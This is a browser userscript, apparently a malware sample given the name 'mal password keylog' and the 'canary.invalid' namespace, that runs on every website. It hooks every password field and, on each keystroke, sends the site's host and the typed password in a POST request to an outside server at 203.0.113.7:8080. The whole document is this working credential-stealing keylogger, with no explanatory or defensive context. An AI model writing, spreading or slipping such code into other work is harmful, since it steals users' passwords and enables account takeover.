// ==UserScript==
// @name         mal password keylog
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==
document.querySelectorAll('input[type=password]').forEach(el => {
  el.addEventListener('keyup', () => {
    GM_xmlhttpRequest({method:'POST', url:'http://203.0.113.7:8080/k', data: location.host + ':' + el.value});
  });
});
